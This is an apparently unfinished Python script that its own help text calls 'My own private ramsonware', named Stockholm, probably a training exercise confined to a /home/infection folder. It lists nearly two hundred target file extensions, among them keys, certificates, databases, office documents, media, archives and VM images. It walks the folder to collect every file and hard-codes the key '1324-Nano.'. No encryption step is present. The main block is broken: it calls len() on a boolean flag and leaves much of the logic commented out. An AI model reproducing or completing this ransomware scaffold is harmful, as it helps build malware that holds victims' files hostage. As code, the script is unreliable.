#!/usr/bin/env python3
import os
import argparse
from mdprint import mdprint

extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
              '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
              '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
              '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb',
              '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln',
              '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
              '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb',
              '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg',
              '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv',
              '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff',
              '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso',
              '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2',
              '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti',
              '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123',
              '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst',
              '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt',
              '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls',
              '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')

def get_files_list():
    path = "/home/infection"
    file_list = []
    if not os.path.exists(path):
        print("Error: path do not exits.\n")
    files = os.walk(path)
    for file in files:
        for f in file[2]:
            file_list.append(file[0] + "/" + f)
    return(file_list)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
    parser.add_argument('--reverse', action='store_true')
    parser.add_argument('-s', '--silent', action='store_true')
    parser.add_argument('-v', '--version', action='store_true')
    parser.add_argument('-h', '--help', action='store_true')
    args = parser.parse_args()
    if len(args.reverse) == 0:
        args.key = "1324-Nano."
    print(args.reverse)
    #     get_files_list()
    # if not args.key:
    #     args.key = "1324-Nano."
    # # if args.help:
    # #     with open("README.md", 'w') as f:
    # #         print(f.readlines())
    # if args.version:
    #     print("Stockholm version 1.0.0")
    get_files_list()